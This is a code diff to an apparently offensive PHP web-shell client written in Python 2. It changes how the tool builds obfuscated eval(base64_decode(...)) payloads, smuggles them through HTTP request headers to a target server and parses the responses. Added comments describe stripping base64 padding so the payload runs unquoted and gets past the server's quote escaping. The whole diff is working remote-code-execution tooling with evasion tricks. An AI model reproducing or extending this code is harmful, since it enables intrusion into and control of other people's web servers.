@@ -40,6 +40,7 @@ class Load:
         self.max_header_size = octets(CNF['SET']['REQ_MAX_HEADER_SIZE'])
         self.max_post_size   = octets(CNF['SET']['REQ_MAX_POST_SIZE'])
         self.zlib_try_limit  = octets(CNF['SET']['REQ_ZLIB_TRY_LIMIT'])
+        self.b64_forwarder   = CNF['SET']['REQ_B64_FORWARDER'].replace('%%PAYLOAD%%', '%s')
         self.interval        = CNF['SET']['REQ_INTERVAL']
 
         available_headers = self.max_headers-len(self.base_headers)-len(self.headers.keys())-1 # -1 for the forwarder
@@ -68,7 +69,12 @@ class Load:
         return(initCode+payload.rstrip(';')+stopCode)
 
     def decapsulate(self, response):
-        try: return(re.findall(self.unparser, response.read())[0])
+        response = response.read()
+        errors   = self.get_php_errors(response)
+        #if 'unexpected $end' in errors:
+        if errors:
+            return(response)
+        try: return(re.findall(self.unparser, response)[0])
         except: return(None)
 
     def load_multipart(self):
@@ -89,12 +95,20 @@ class Load:
             self.multipart['sender']  = self.encapsulate(self.multipart['sender'])
 
     def build_forwarder(self, method, decoder):
-        obfuscator   = "preg_replace('/(.*)/e','ev'.'al(ba'.'se6'.'4_de'.'code(\"%s\"))','');"
         template     = self.forwarder_template[method].replace('%%PASSKEY%%',self.passkey)
         decoder      = decoder % "$x"
         rawForwarder = template % decoder
-        forwarder    = obfuscator % base64.b64encode(rawForwarder)
-        return(forwarder)
+        b64Forwarder = base64.b64encode(rawForwarder)
+
+        # here we delete the ending "=" from base64 payload
+        # because if the string is not enquoted it will not be
+        # evaluated. on iis6, apache2, php>=4.4 it dont seem
+        # to return error, and is a hacky solution to eval a payload
+        # without quotes, preventing header quote escape by server
+        # eg: "eval(base64_decode(89jjLKJnj))"
+        b64Forwarder = b64Forwarder.rstrip('=')
+
+        return(self.b64_forwarder % b64Forwarder)
 
     def build_get_headers(self, payload):
         def get_header_names(num):
@@ -198,7 +212,8 @@ class Load:
 
         request = urllib2.Request(self.target, content, headers)
         try:
-            response['data'] = self.decapsulate(self.opener.open(request))
+            resp = self.opener.open(request)
+            response['data'] = self.decapsulate(resp)
         except urllib2.HTTPError, e:
             response['data'] = self.decapsulate(e)
             if response['data'] is None:
